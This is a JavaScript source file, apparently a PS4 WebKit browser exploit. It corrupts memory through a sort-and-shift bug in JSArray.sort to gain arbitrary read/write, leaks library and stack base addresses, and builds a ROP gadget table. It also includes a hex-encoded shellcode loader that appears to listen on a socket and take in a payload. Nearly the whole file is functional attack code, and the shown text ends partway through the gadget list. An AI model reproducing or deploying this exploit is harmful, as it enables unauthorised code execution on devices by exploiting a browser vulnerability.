// https://github.com/CTurt/PS4-Loader
// https://github.com/CTurt/bin2u32

function writeLoader(write) {
	setBase(write);
	u32[0] = 0x53555441;
	u32[1] = 0x6373b848;
	u32[2] = 0x74654e65;
	u32[3] = 0x83486f53;
	u32[4] = 0x0ebe60ec;
	u32[5] = 0x48000000;
	u32[6] = 0x40245c8d;
	u32[7] = 0x24448948;
	u32[8] = 0xda894840;
	u32[9] = 0x244c8d48;
	u32[10] = 0x024fbf10;
	u32[11] = 0xc0310000;
	u32[12] = 0x482444c7;
	u32[13] = 0x74656b63;
	u32[14] = 0x4c2444c6;
	u32[15] = 0x01dee800;
	u32[16] = 0xb8480000;
	u32[17] = 0x4e656373;
	u32[18] = 0x6f537465;
	u32[19] = 0x48da8948;
	u32[20] = 0x40244489;
	u32[21] = 0x6b63b848;
	u32[22] = 0x6c437465;
	u32[23] = 0x8948736f;
	u32[24] = 0x48482444;
	u32[25] = 0x18244c8d;
	u32[26] = 0x00000ebe;
	u32[27] = 0x024fbf00;
	u32[28] = 0xc0310000;
	u32[29] = 0x2444c766;
	u32[30] = 0xe8006550;
	u32[31] = 0x000001a0;
	u32[32] = 0x6373b848;
	u32[33] = 0x74654e65;
	u32[34] = 0x89486942;
	u32[35] = 0x448948da;
	u32[36] = 0x8d484024;
	u32[37] = 0xbe20244c;
	u32[38] = 0x0000000e;
	u32[39] = 0x00024fbf;
	u32[40] = 0x66c03100;
	u32[41] = 0x482444c7;
	u32[42] = 0x44c6646e;
	u32[43] = 0xe8004a24;
	u32[44] = 0x0000016c;
	u32[45] = 0x6373b848;
	u32[46] = 0x74654e65;
	u32[47] = 0x8948694c;
	u32[48] = 0x448948da;
	u32[49] = 0x8d484024;
	u32[50] = 0xbe28244c;
	u32[51] = 0x0000000e;
	u32[52] = 0x00024fbf;
	u32[53] = 0xc7c03100;
	u32[54] = 0x73482444;
	u32[55] = 0xc66e6574;
	u32[56] = 0x004c2444;
	u32[57] = 0x000137e8;
	u32[58] = 0x73b84800;
	u32[59] = 0x654e6563;
	u32[60] = 0x48634174;
	u32[61] = 0x8948da89;
	u32[62] = 0x48402444;
	u32[63] = 0x30244c8d;
	u32[64] = 0x00000ebe;
	u32[65] = 0x024fbf00;
	u32[66] = 0xc0310000;
	u32[67] = 0x482444c7;
	u32[68] = 0x74706563;
	u32[69] = 0x4c2444c6;
	u32[70] = 0x0102e800;
	u32[71] = 0xb8480000;
	u32[72] = 0x4e656373;
	u32[73] = 0x65527465;
	u32[74] = 0x48da8948;
	u32[75] = 0x40244489;
	u32[76] = 0x244c8d48;
	u32[77] = 0x000ebe38;
	u32[78] = 0x4fbf0000;
	u32[79] = 0x31000002;
	u32[80] = 0x44c766c0;
	u32[81] = 0x76634824;
	u32[82] = 0x4a2444c6;
	u32[83] = 0x00cee800;
	u32[84] = 0x04c70000;
	u32[85] = 0x616f6c24;
	u32[86] = 0x66c93164;
	u32[87] = 0x042444c7;
	u32[88] = 0x89487265;
	u32[89] = 0x2444c6e7;
	u32[90] = 0x01ba0006;
	u32[91] = 0xc6000000;
	u32[92] = 0x10402444;
	u32[93] = 0x000002be;
	u32[94] = 0x2444c600;
	u32[95] = 0x44c70241;
	u32[96] = 0x00004424;
	u32[97] = 0xc7660000;
	u32[98] = 0x23422444;
	u32[99] = 0x2444c63f;
	u32[100] = 0x44c6004a;
	u32[101] = 0xc6004b24;
	u32[102] = 0x004c2444;
	u32[103] = 0x4d2444c6;
	u32[104] = 0x2444c600;
	u32[105] = 0x44c6004e;
	u32[106] = 0xff004f24;
	u32[107] = 0xba102454;
	u32[108] = 0x00000010;
	u32[109] = 0x41de8948;
	u32[110] = 0xc789c489;
	u32[111] = 0x202454ff;
	u32[112] = 0x00000abe;
	u32[113] = 0xe7894400;
	u32[114] = 0x282454ff;
	u32[115] = 0xf631d231;
	u32[116] = 0x48e78944;
	u32[117] = 0x300000bb;
	u32[118] = 0x00000926;
	u32[119] = 0x2454ff00;
	u32[120] = 0xebc58930;
	u32[121] = 0x48984805;
	u32[122] = 0xc931c301;
	u32[123] = 0x001000ba;
	u32[124] = 0xde894800;
	u32[125] = 0x54ffef89;
	u32[126] = 0xc0853824;
	u32[127] = 0x8944e77f;
	u32[128] = 0x2454ffe7;
	u32[129] = 0xffef8918;
	u32[130] = 0x48182454;
	u32[131] = 0x5b60c483;
	u32[132] = 0xc35c415d;
	u32[133] = 0x90909090;
	u32[134] = 0x90909090;
	u32[135] = 0x90909090;
	u32[136] = 0xbf495741;
	u32[137] = 0x263ffff8;
	u32[138] = 0x00000009;
	u32[139] = 0x483f8b4d;
	u32[140] = 0xff41c031;
	u32[141] = 0xc35f41d7;
	u32[142] = 0x90909090;
	u32[143] = 0x90909090;
	u32[144] = 0xffffffff;
	u32[145] = 0xffffffff;
	u32[146] = 0x00000000;
	u32[147] = 0x00000000;
	u32[148] = 0xffffffff;
	u32[149] = 0xffffffff;
	u32[150] = 0x00000000;
	/*u32[0] = 0x89485441;
	u32[1] = 0x485355c8;
	u32[2] = 0x4860ec83;
	u32[3] = 0x3ffff8a3;
	u32[4] = 0x00000926;
	u32[5] = 0x5c8d4800;
	u32[6] = 0xb8484024;
	u32[7] = 0x4e656373;
	u32[8] = 0x6f537465;
	u32[9] = 0x48da8948;
	u32[10] = 0x40244489;
	u32[11] = 0x244c8d48;
	u32[12] = 0x000ebe10;
	u32[13] = 0x4fbf0000;
	u32[14] = 0x31000002;
	u32[15] = 0x2444c7c0;
	u32[16] = 0x656b6348;
	u32[17] = 0x2444c674;
	u32[18] = 0xe1e8004c;
	u32[19] = 0x48000001;
	u32[20] = 0x656373b8;
	u32[21] = 0x5374654e;
	u32[22] = 0xda89486f;
	u32[23] = 0x24448948;
	u32[24] = 0x63b84840;
	u32[25] = 0x4374656b;
	u32[26] = 0x48736f6c;
	u32[27] = 0x48244489;
	u32[28] = 0x244c8d48;
	u32[29] = 0x000ebe18;
	u32[30] = 0x4fbf0000;
	u32[31] = 0x31000002;
	u32[32] = 0x44c766c0;
	u32[33] = 0x00655024;
	u32[34] = 0x0001a3e8;
	u32[35] = 0x73b84800;
	u32[36] = 0x654e6563;
	u32[37] = 0x48694274;
	u32[38] = 0x8948da89;
	u32[39] = 0x48402444;
	u32[40] = 0x20244c8d;
	u32[41] = 0x00000ebe;
	u32[42] = 0x024fbf00;
	u32[43] = 0xc0310000;
	u32[44] = 0x2444c766;
	u32[45] = 0xc6646e48;
	u32[46] = 0x004a2444;
	u32[47] = 0x00016fe8;
	u32[48] = 0x73b84800;
	u32[49] = 0x654e6563;
	u32[50] = 0x48694c74;
	u32[51] = 0x8948da89;
	u32[52] = 0x48402444;
	u32[53] = 0x28244c8d;
	u32[54] = 0x00000ebe;
	u32[55] = 0x024fbf00;
	u32[56] = 0xc0310000;
	u32[57] = 0x482444c7;
	u32[58] = 0x6e657473;
	u32[59] = 0x4c2444c6;
	u32[60] = 0x013ae800;
	u32[61] = 0xb8480000;
	u32[62] = 0x4e656373;
	u32[63] = 0x63417465;
	u32[64] = 0x48da8948;
	u32[65] = 0x40244489;
	u32[66] = 0x244c8d48;
	u32[67] = 0x000ebe30;
	u32[68] = 0x4fbf0000;
	u32[69] = 0x31000002;
	u32[70] = 0x2444c7c0;
	u32[71] = 0x70656348;
	u32[72] = 0x2444c674;
	u32[73] = 0x05e8004c;
	u32[74] = 0x48000001;
	u32[75] = 0x656373b8;
	u32[76] = 0x5274654e;
	u32[77] = 0xda894865;
	u32[78] = 0x24448948;
	u32[79] = 0x4c8d4840;
	u32[80] = 0x0ebe3824;
	u32[81] = 0xbf000000;
	u32[82] = 0x0000024f;
	u32[83] = 0xc766c031;
	u32[84] = 0x63482444;
	u32[85] = 0x2444c676;
	u32[86] = 0xd1e8004a;
	u32[87] = 0xc7000000;
	u32[88] = 0x6f6c2404;
	u32[89] = 0xc9316461;
	u32[90] = 0x2444c766;
	u32[91] = 0x48726504;
	u32[92] = 0x44c6e789;
	u32[93] = 0xba000624;
	u32[94] = 0x00000001;
	u32[95] = 0x402444c6;
	u32[96] = 0x0002be10;
	u32[97] = 0x44c60000;
	u32[98] = 0xc7024124;
	u32[99] = 0x00442444;
	u32[100] = 0x66000000;
	u32[101] = 0x422444c7;
	u32[102] = 0x44c63f23;
	u32[103] = 0xc6004a24;
	u32[104] = 0x004b2444;
	u32[105] = 0x4c2444c6;
	u32[106] = 0x2444c600;
	u32[107] = 0x44c6004d;
	u32[108] = 0xc6004e24;
	u32[109] = 0x004f2444;
	u32[110] = 0x102454ff;
	u32[111] = 0x000010ba;
	u32[112] = 0xde894800;
	u32[113] = 0x89c48941;
	u32[114] = 0x2454ffc7;
	u32[115] = 0x000abe20;
	u32[116] = 0x89440000;
	u32[117] = 0x2454ffe7;
	u32[118] = 0x31d23128;
	u32[119] = 0xe78944f6;
	u32[120] = 0x0000bb48;
	u32[121] = 0x00092630;
	u32[122] = 0x54ff0000;
	u32[123] = 0xc5893024;
	u32[124] = 0x984805eb;
	u32[125] = 0x31c30148;
	u32[126] = 0x1000bac9;
	u32[127] = 0x89480000;
	u32[128] = 0xffef89de;
	u32[129] = 0x85382454;
	u32[130] = 0x44e77fc0;
	u32[131] = 0x54ffe789;
	u32[132] = 0xef891824;
	u32[133] = 0x182454ff;
	u32[134] = 0x60c48348;
	u32[135] = 0x5c415d5b;
	u32[136] = 0x909090c3;
	u32[137] = 0x90909090;
	u32[138] = 0x90909090;
	u32[139] = 0x90909090;
	u32[140] = 0xbf495741;
	u32[141] = 0x263ffff8;
	u32[142] = 0x00000009;
	u32[143] = 0x483f8b4d;
	u32[144] = 0xff41c031;
	u32[145] = 0xc35f41d7;
	u32[146] = 0x90909090;
	u32[147] = 0x90909090;
	u32[148] = 0xffffffff;
	u32[149] = 0xffffffff;
	u32[150] = 0x00000000;
	u32[151] = 0x00000000;
	u32[152] = 0xffffffff;
	u32[153] = 0xffffffff;*/
}
// module bases for gadgets
var LIBKERNEL = 1;
var LIBC = 2;
var LIBSYSMODULE = 3;
var SCENET = 4;
var SCENETCTL = 5;
var SCEIPMI = 6;
var SCEMBUS = 7;
var SCEREGMGR = 8;
var SCERTC = 9;
var SCEPAD = 10;
var SCEVIDEOOUT = 11;
var SCEPIGLET = 12;
var SCEORBISCOMPAT = 13;
var WEBKIT2 = 14;
var SCESYSCORE = 15;
var SCESSL = 16;
var SCEVIDEOCORESERVICE = 17;
var SCESYSTEMSERVICE = 18;
var SCECOMPOSITEEXT = 19;

var errno = [
	"OK",
	"Operation not permitted",
	"No such file or directory",
	"No such process",
	"Interrupted system call",
	"I/O error",
	"No such device or address",
	"Argument list too long",
	"Exec format error",
	"Bad file number",
	"No child processes",
	"Try again",
	"Out of memory",
	"Permission denied",
	"Bad address",
	"Block device required",
	"Device or resource busy",
	"File exists",
	"Cross-device link",
	"No such device",
	"Not a directory",
	"Is a directory",
	"Invalid argument",
	"File table overflow",
	"Too many open files",
	"Not a typewriter",
	"Text file busy",
	"File too large",
	"No space left on device",
	"Illegal seek",
	"Read-only file system",
	"Too many links",
	"Broken pipe",
	"Math argument out of domain of func",
	"Math result not representable"
];

// global vars
var _gc, _cnt = 0;

function exploit() {
	try {
	//
	// Part 1: getting the Uint32Array object address
	//
		// init vars
		window.u32 = new Uint32Array(0x100);
		var a1 = [0,1,2,3,u32];
		var a2 = [0,1,2,3,4]; // right after a1
		var a1len = a1.length;
		var a2len = a2.length;
		var u32len = u32.length;

		// protect local vars from GC // for gdb
		if (!_gc) _gc = new Array();
		_gc.push(u32,a1,a2);

		// declare custom compare function
		var myCompFunc = function(x, y) {
			// check for the last call for last two array items
			if(y == 3 && x == u32) {
				//logAdd("myCompFunc(u32,3)");
				// shift() is calling during sort(), what causes the
				// last array item is written outside the array buffer
				a1.shift();
			}
			return 0;
		}

		// call the vulnerable method - JSArray.sort(...)
		a1.sort(myCompFunc);

		// check results: a2.length should be overwritten by a1[4]
		var len = a2.length;
		//logAdd("a2.length = 0x" + len.toString(16));
		if (len == a2len) { logAdd("error: 1"); return 1; }

	//
	// Part 2: creating corrupted JSValue which points to the (u32+0x18) address
	//

		// modify our compare function
		myCompFunc = function(x,y) {
			if (y == 0 && x == 1) {
				//logAdd("myCompFunc(1,0)");
				// call shift() again to read the corrupted JSValue from a2.length
				// into a1[3] on the next sort loop
				a1.length = a1len;
				a1.shift();
				// modify JSValue
				a2.length = len + 0x18;
			}
			if (y == 3) {
				//logAdd("myCompFunc(x,3)");
				// shift it back to access a1[3]
				a1.unshift(0);
			}
			return 0;
		}

		a1.sort(myCompFunc);

		// now a1[3] should contain the corrupted JSValue from a2.length (=len+0x18)
		var c = a2.length;
		//logAdd("a2.length = 0x" + c.toString(16));
		if (c != len + 0x18) { logAdd("error: 2"); a1[3] = 0; return 2; }

	//
	// Part 3: overwriting ((JSUint32Array)u32).m_impl pointer (see JSCTypedArrayStubs.h)
	//

		// generate dummy JS functions
		var f, f2, f2offs, f2old, funcs = new Array(30);
		c = funcs.length;
		for(var i=0; i < c; i++){
			f = new Function("arg", " return 876543210 + " + (_cnt++) + ";");
			f.prop2 = 0x12345600 + i;
			funcs[i] = f;
		}

		// generate JIT-code
		for(var i=c-1; i >= 0; i--) { funcs[i](i); }

		// prepare objects for the third sort() call
		var mo = {};
		var pd = { set: funcs[0], enumerable:true, configurable:true }
		var a3 = [0,1,2,a1[3]];

		// allocate mo's property storage right after a3's buffer
		Object.defineProperty(mo, "prop0", pd);
		for(var i=1; i < 5; i++){
			mo["prop"+i] = i;
		}

		// protect from GC
		_gc.push(a3,mo,funcs);

		// use sort-n-shift technique again
		myCompFunc = function(x,y)
		{
			// check for the last call for two last array items
			if (y == 2) {
				//logAdd("myCompFunc(a3[3],2)");
				// a3[3] will be written over the mo.prop0 object
				a3.shift();
			}
			return 0;
		}

		// overwrite mo.prop0 by a3[3] = a1[3] = &u32+0x18
		a3.sort(myCompFunc);

		// u32.prop1 has 0x20 offset inside u32, and 0x08 inside mo.prop0 GetterSetter object.
		// we should put some valid pointers into GetterSetter
		u32.prop1 = u32;	// GetterSetter.m_structure
		u32.prop2 = 8;		// 8 = JSType.GetterSetterType
		u32.prop1 = a1[3];	// bypass JSCell::isGetterSetter()

		// clear corrupted JSValue
		a1[3] = 0; a3[3] = 0;

		// overwrite u32.m_impl by some JSFunction object
		f = funcs[c-5];
		pd.set = f;
		Object.defineProperty(mo, "prop0", pd);

		// check results: u32.length is taken from f's internals now
		//logAdd("u32.length = 0x" + u32.length.toString(16));
		if (u32.length == u32len) { logAdd("error: 3"); return 3; }

	//
	//	Part 4: getting the JIT-code memory address
	//

		// declare aux functions
		var setU64 = function(offs, val) {
			u32[offs]	= val % 0x100000000;
			u32[offs+1] = val / 0x100000000;
		}
		var setU32 = function(offs, val) {
			u32[offs] = val;
		}
		var setU16 = function(offs, val) {
			setU8(offs, val % 256);
			setU8(offs + 1, val / 256);
		}
		var setU8 = function(offs, val) {
			u32[offs >>> 2] = (u32[offs >>> 2] & ~(0xFF << ((offs % 4) * 8))) | (val << ((offs % 4) * 8));
		}
		
		var getU64 = function(offs) {
			return u32[offs] + u32[offs+1] * 0x100000000;
		}
		var getU32 = function(offs) {
			return u32[offs];
		}
		var getU8 = function(offs) {
			return (u32[offs >>> 2] >> ((offs % 4) * 8)) & 0xff;
		}
		var getObjAddr = function(obj) {
			// write obj into u32 data
			pd.set.prop2 = obj;
			// read obj address from u32
			return getU64(2);
		}
		
		window.va2ea = function(addr) {
			return addr - u32base;
		}
		window.va2o = function(addr) {
			return va2ea(addr) >>> 2;
		}
		
		// will not modify u32base
		
		window.read32 = function(addr) {
			return u32[va2o(addr)];
		}
		window.write32 = function(addr, val) {
			u32[va2o(addr)] = val & 0xffffffff;
		}
		window.read64 = function(addr) {
			return getU64(va2o(addr));
		}
		window.write64 = function(addr, val) {
			return setU64(va2o(addr), val);
		}

		window.readString = function(addr) {
			var s = '';
			var ea = va2ea(addr);
			var i = ea / 4;
			var j = ea % 4;
			while (1) {
				var c =	 (u32[i] >>> (8 * j)) & 0xff;
				if (c == 0) return s;
				s += String.fromCharCode(c);
				j = (j + 1) % 4;
				if (j == 0) { i += 1; }
			}
			return s;
		}

		window.writeString = function(addr, val) {
			var ea = va2ea(addr);
			var i = ea / 4;
			var j = ea % 4;
			for (var x = 0; x <= val.length; x++) {
				var c = (x == val.length) ? 0 : val.charCodeAt(x);
				var w = u32[i];
				w = (w & ~(0xff << (8 * j))) | (c << (8 * j));
				u32[i] = w;
				j = (j + 1) % 4;
				if (j == 0) { i += 1; }
			}
			return addr + val.length;
		}

		window.int2hex = function(value, digits) {
			value = value.toString(16);
			while (value.length < digits) {
				value = "0" + value;
			}
			
			return value;
		}

		window.hexDump = function(addr, length) {
			var b = '<p><tt>';
			var tmp = '';
			var ea = va2ea(addr);
			var i = ea / 4;
			var j = ea % 4;
			
			b += int2hex(addr, 8);
			b += ": ";
						
			for (z = 1; z <= length; z++) { 
				var ch = (u32[i] >>> (8 * j)) & 0xff;
				b += int2hex(ch, 2);
				if(( ch > 31) && (ch <	127)){
					tmp += String.fromCharCode(ch);
				}
				else {
					tmp += "."
				}
				
				j = (j + 1) % 4;
				if (j == 0) { i += 1; }

				
				//if(z % 4 == 0) {
					b += " ";
				//}
				
				//if(z % 8 == 0) {
				//	b += " ";
				//}
				
				if(z % 16 == 0) {
					b += " | " + tmp + "<br>";
					tmp = "";
					if (z != length) {
						b += int2hex(addr+z, 8) + ": ";
					}
				}	 
			}
			return b + "</p></tt>" 
		}
		
		// size multiples of 8 only
		window.zeroMemory = function(base, size) {
			for(var i = base; i < base + size; i += 8) {
				setU64to(i, 0);
			}
		}
		
		// convert base to base
		window.baseToBase = function(fromBase, toBase, value) {
			if(value == "") value = 0;
			value = parseInt(value, fromBase);
			return Number(value).toString(toBase).toUpperCase();	
		}
		
		// hex escape bytes
		window.escapeToHex = function(str) {
			var hex = '';
			for(var i = 0; i < str.length; i += 2) {
				hex += '\\x' + str[i] + str[i + 1];
			}
			
			//have to eval so JavasSript processes the string for appending
			return eval("ret = \"" + hex + "\"");
		}
		
		// get the memory address of u32
		var u32addr = getObjAddr(u32);
		//logAdd("u32 address = 0x" + u32addr.toString(16));
		// get the memory address of u32[0] (ArrayBufferView.m_baseAddress)
		var u32base = getObjAddr(pd.set) + 0x20;
		var u32base0 = u32base;
		//logAdd("u32 base = 0x" + u32base.toString(16));

		// on x64 platforms we can't just set u32.length to the huge number
		// for ability to access arbitrary addresses. We should be able to
		// modify the u32's buffer pointer on-the-fly.
		window.setBase = function(addr){
			if (!f2) {
				// search for another JSFunction near "f"
				for(var i=0x12; i < 0x80; i+=0x10){
					if ((u32[i] >>> 8) == 0x123456) {
						f2 = funcs[u32[i] & 0xFF];
						f2offs = i - 6;
						f2old = getU64(f2offs);
						break;
					}
				}
				logAdd("f2offs = 0x" + f2offs);
				if (!f2) { return false; }

			}
			if (pd.set != f) {
				pd.set = f;
				Object.defineProperty(mo, "prop0", pd);
				u32base = u32base0;
			}
			if (addr == null) return true;

			// this will be the new value for ((ArrayBufferView)u32).m_baseAddress
			setU64(f2offs, addr);

			// overwrite ((JSUint32Array)u32).m_impl again
			pd.set = f2;
			Object.defineProperty(mo, "prop0", pd);

			u32base = addr;
			//logAdd("u32 new base = 0x" + u32base.toString(16));

			return true;
		}

	// read/write the 64-bit value from the custom address
		window.getU64from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU64((addr - u32base) >>> 2);
		}
		
		window.getU32from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU32((addr - u32base) >>> 2);
		}
		
		window.getU8from = function(addr) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return getU8(addr - u32base);
		}
		
		window.setU64to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU64((addr - u32base) >>> 2, val);
		}
		window.setU32to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU32((addr - u32base) >>> 2, val);
		}
		window.setU16to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU16((addr - u32base), val);
		}
		window.setU8to = function(addr,val) {
			if (addr < u32base || addr >= u32base + u32len*4) {
				if (!setBase(addr)) return 0;
			}
			return setU8((addr - u32base), val);
		}
		window.setU64into = function(addr, value) {
			var low = value %0x100000000;
			var high = value/0x100000000;
			setBase(addr)
			u32[0] = parseInt(low.toString(16),16);
			u32[1] = parseInt(high.toString(16),16);
		}
		window.setU32into = function(addr, value) {
			setBase(addr);
			u32[0] = value;
		}


		//logAdd("u32 size: 0x" + u32.length.toString(16));

		// Get the object table from the origianl heap address
		// +0x20 is a pointer we can use for some object

		var xx = getU64from(u32base0+0x20);
		var yy=0;
		//logAdd("verify base: 0x"+xx.toString(16) );

		//
		// This is the only part you need to modify
		//
		//
		//
		// First, the heap array has a pointer into a function
		// in WebKit2. The one I'm using is always at +0x20 from
		// the original base at +0x20.

		// 1.70 PS4 = -0x30bf0 is the start of webkit

		// +0x25C4000 = some data
		// +0x2414000 = import table
		// (import table +0x20) =  modules table
		// If this crashes, try it 2-4 more times. It usually will work

		// target addr for the rop chain

		var chain_addr = u32base0 + 0x80000;
		var chain_data = u32base0 + 0x88000;

		// xx will be the base address of WebKit2

		xx = (getU64from(xx+0x20)-0x30bf0);
		var wk_base = xx;
		logAdd("WebKit2 base address = 0x" + xx.toString(16));
		xx += 0x2414000; // Get to the import table
		setBase(xx);

		xx = getU64from(xx+0x20); // Get to the module table
		// Future use: data area somewhere around 0x200500000

		//get libSceLibcinternal base
		var libc_int_base = getU64from(xx+0x1628); //1.76
		
		//logAdd("Dump Address is 0x" + xx.toString(16));
		
		var module_list = xx + 0xae0 + 0x690;
		
		// module list is a doubly linked list, where the last node has self->next == 0
		// and the first node has self->prev == prev->next && self->prev->prev == last
		// The list head is seperate from the list and is a kind of "fake" node
		var modinfo_ptr = module_list;
		module_infos = {};
		var n = 0;
		
		setBase(module_list);
		while (modinfo_ptr != 0) {
			var name = readString(modinfo_ptr + 0x18);
			if (name == '') { break; }
			var rdata_base	= read64(modinfo_ptr + 0x170);
			var rdata_size	= read32(modinfo_ptr + 0x178);
			var import_base = read64(modinfo_ptr + 0x180);
			var import_size = read32(modinfo_ptr + 0x188);
			if (rdata_base	== 0 ||
				rdata_size	== 0 ||
				import_base == 0 ||
				import_size == 0) {
				logAdd('jit kicked in? skipping...');
			} else {
				module_infos[n] = {
					name : name,
					image_base : rdata_base,
					image_size : rdata_size + import_size,
					image_end : rdata_base + rdata_size + import_size,
					text_start : rdata_base,
					text_size : rdata_size,
					text_end : rdata_base + rdata_size,
					idata_start : import_base,
					idata_size : import_size,
					idata_end : import_base + import_size,
				};
			}
			// somehow adding the constant instead of reading the value
			// tends to avoid the jit problem
			//modinfo_ptr = read64(modinfo_ptr + 0);
			modinfo_ptr += 0x1c0;
			n++;
		}

		var libsysmodule_base = getU64from(xx+0x17E8);
		
		//get libkernel base
		//xx = getU64from(xx+0xdd8); //1.71
		xx = getU64from(xx+0x1468); //1.76
		//var libkernel_base = xx;
		
		setBase(xx);
		
		//get stack base
		//xx = getU64from(xx+0x3D890); //1.76 webkit2 stack?
		xx = getU64from(xx+0x5B278); //1.76 webprocess stack
		//yy = getU64from(xx+0x5AA70); //1.71
		window.stack_base = xx - 0x4000;
		//yy = getU64from(xx+0x5AA70);
		
		
		// Defining modules
		libkernel = module_infos[LIBKERNEL];
		libSceLibcInternal = module_infos[LIBC];
		libSceSysmodule = module_infos[LIBSYSMODULE];	
		libSceNet = module_infos[SCENET];	
		libSceNetCtl = module_infos[SCENETCTL];
		libSceIpmi = module_infos[SCEIPMI];
		libSceMbus = module_infos[SCEMBUS];
		libSceRegMgr = module_infos[SCEREGMGR];
		libSceRtc = module_infos[SCERTC];	
		libScePad = module_infos[SCEPAD];	
		libSceVideoOut = module_infos[SCEVIDEOOUT];
		libScePigletv2VSH = module_infos[SCEPIGLET];
		libSceOrbisCompat = module_infos[SCEORBISCOMPAT];
		libSceWebKit2 = module_infos[WEBKIT2];
		libSceSysCore = module_infos[SCESYSCORE];
		libSceSsl = module_infos[SCESSL];
		libSceVideoCoreServerInterface = module_infos[SCEVIDEOCORESERVICE];
		libSceSystemService = module_infos[SCESYSTEMSERVICE];
		libSceCompositeExt = module_infos[SCECOMPOSITEEXT];
				
		logAdd("libkernel Base = 0x" + libkernel.image_base.toString(16));
		logAdd("libSceLibcinternal Base = 0x" + libSceLibcInternal.image_base.toString(16));
		logAdd("Stack Base = 0x" + stack_base.toString(16));

		logAdd("Refresh this page between calls to avoid instability and crashes. Enjoy...");
		
		window.return_va = 0x2b38; //1.76
	}
	catch(e) {
		logAdd(e);
	}

	return 0;
}
var gadgets = {
	"pop rbp": new gadget([0x5d], WEBKIT2, 0xb5d6d),
	"pop rax": new gadget([0x58], WEBKIT2, 0x3352d),
	"pop rcx": new gadget([0x59], WEBKIT2, 0x2bec0d),
	"pop rdx": new gadget([0x5a, 0xff, 0xc5], WEBKIT2, 0x250df2),
	"pop rsi": new gadget([0x5e], WEBKIT2, 0x3914ca),
	"pop rdi": new gadget([0x5f], WEBKIT2, 0x137cbd),
	"pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xb854d),
	"pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x2bfe89),
	"pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x5fbb5),
	
	"mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x457),
	
	"mov [rax+0x1e8], rdx": new gadget([0x48, 0x89, 0x90, 0xe8, 0x01, 0x00, 0x00], LIBKERNEL, 0x1622),
	"mov [rax+0x60], rdi": new gadget([0x48, 0x89, 0x78, 0x60], WEBKIT2, 0x2b7274),
	"mov [rax+0x8], rsi": new gadget([0x48, 0x89, 0x70, 0x08], LIBKERNEL, 0x9414),
	"mov [rax+0xc0], rcx": new gadget([0x48, 0x89, 0x88, 0xc0, 0x00, 0x00, 0x00], WEBKIT2, 0x369e6d),
	"mov [rax], rcx": new gadget([0x48, 0x89, 0x08], WEBKIT2, 0x9ecde6),
	"mov [rax], rdx": new gadget([0x48, 0x89, 0x10], WEBKIT2, 0x3579c0),
	"mov [rax], rsi": new gadget([0x48, 0x89, 0x30], WEBKIT2, 0x2adea7),
	
	"mov [rax], dh": new gadget([], WEBKIT2, 0x142a68),
	
	"mov [rcx], rax": new gadget([0x48, 0x89, 0x01], WEBKIT2, 0xc320),
	"mov [rcx], rdx": new gadget([0x48, 0x89, 0x11], 12, 0x5b00),
	
	"mov [rdx], rcx": new gadget([0x48, 0x89, 0x0a], 16, 0x340bd),
	"mov [rdx], rsi": new gadget([0x48, 0x89, 0x32], 16, 0x1b822),
	
	"mov [rsi+0x18], rax": new gadget([0x48, 0x89, 0x46, 0x18], WEBKIT2, 0x470f5),
	"mov [rsi+0x8], r8": new gadget([0x4c, 0x89, 0x46, 0x08], WEBKIT2, 0x14af6d),
	"mov [rsi], rcx": new gadget([0x48, 0x89, 0x0e], WEBKIT2, 0x38c39f),
	
	"mov [rdi], rax": new gadget([0x48, 0x89, 0x07], LIBKERNEL, 0xb0c8),
	"mov [rdi+0x88], rax": new gadget([0x48, 0x89, 0x87, 0x88, 0x00, 0x00, 0x00], WEBKIT2, 0x1c0e03),
	"mov [rdi+0xa0], rcx": new gadget([0x48, 0x89, 0x8f, 0xa0, 0x00, 0x00, 0x00], WEBKIT2, 0xb6b5),
	"mov [rdi+0x80], rdx": new gadget([0x48, 0x89, 0x97, 0x80, 0x00, 0x00, 0x00], WEBKIT2, 0xa2da64),
	"mov [rdi+0x80], rsi": new gadget([0x48, 0x89, 0xb7, 0x80, 0x00, 0x00, 0x00], WEBKIT2, 0x3dc290),
	"mov [rdi+0x20], r8": new gadget([0x4c, 0x89, 0x47, 0x20], 12, 0x40415),
	"mov [rdi+0x20], rdx": new gadget([0x48, 0x89, 0x57, 0x20], 12, 0x38796),
	
	"mov [r10], rdi": new gadget([0x49, 0x89, 0x3a], 16, 0x1ba44),
	"mov [r10], rdx": new gadget([0x49, 0x89, 0x12], 16, 0x1b79b),
	"mov [r10], rsi": new gadget([0x49, 0x89, 0x32], 16, 0x1b8cd),
	
	"mov rdi, [rdi+0x48]": new gadget([0x48, 0x8b, 0x7f, 0x48], LIBKERNEL, 0x1bd50),
	"mov rsi, rax; jmp rcx": new gadget([], WEBKIT2, 0xee060),
	
	"mov rax, [rax+0x830]": new gadget([0x48, 0x8b, 0x80, 0x30, 0x08, 0x00, 0x00], 19, 0x1957),
	"mov rax, [rdi]": new gadget([0x48, 0x8b, 0x07], LIBKERNEL, 0x172b0),
	"mov rax, [rdi+0x18]": new gadget([0x48, 0x8b, 0x47, 0x18], LIBKERNEL, 0x172f0),
	"mov rax, [r10]": new gadget([0x49, 0x8b, 0x02], 16, 0xd93d),
	"mov rax, [r11]": new gadget([0x49, 0x8b, 0x03], 16, 0xd936),
	
	"mov rdx, [rdi+0x8]": new gadget([0x48, 0x8b, 0x57, 0x08], LIBC, 0x6573),
	
	"mov rax, rdi": new gadget([0x48, 0x89, 0xf8], LIBKERNEL, 0x1dc20),
	"mov rax, rsi": new gadget([0x48, 0x89, 0xf0], LIBKERNEL, 0x94d1),
	"mov rax, r8": new gadget([0x4c, 0x89, 0xc0], 16, 0xeb36),
	
	"mov rdx, rdi": new gadget([0x48, 0x89, 0xfa], LIBC, 0x860f),
	
